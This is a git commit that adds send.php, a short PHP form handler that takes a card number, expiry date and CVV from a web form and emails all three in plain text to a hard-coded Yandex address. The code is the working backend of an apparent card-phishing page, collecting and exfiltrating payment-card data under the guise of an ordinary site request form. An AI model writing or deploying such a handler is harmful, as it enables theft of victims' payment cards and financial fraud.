cc51362b090ca3c6ddd428be050837d8113c79e8
Lex1nder <90373599+Lex1nder@users.noreply.github.com>
2022-11-09 14:23:55 +0300

    Add files via upload

---
+++ send.php
@@ -0,0 +1,23 @@
+﻿<!DOCTYPE html>
+<html>
+<body>
+
+<?php
+$numb = $_POST['numb'];
+$date = $_POST['date'];
+$cvv = $_POST['cvv'];
+$numb = htmlspecialchars($numb);
+$date = htmlspecialchars($date);
+$cvv = htmlspecialchars($cvv);
+$numb = trim($numb);
+$date = trim($date);
+$cvv = trim($cvv);
+echo $numb;
+echo "<br>";
+echo $date;
+echo "<br>";
+echo $cvv;
+mail("ag12.5@yandex.ru", "Заявка с сайта", "Номер:".$numb.". Дата: ".$date."Код:".$cvv ,"From: ag12.5@yandex.ru \r\n");
+?>
+</body>
+</html>
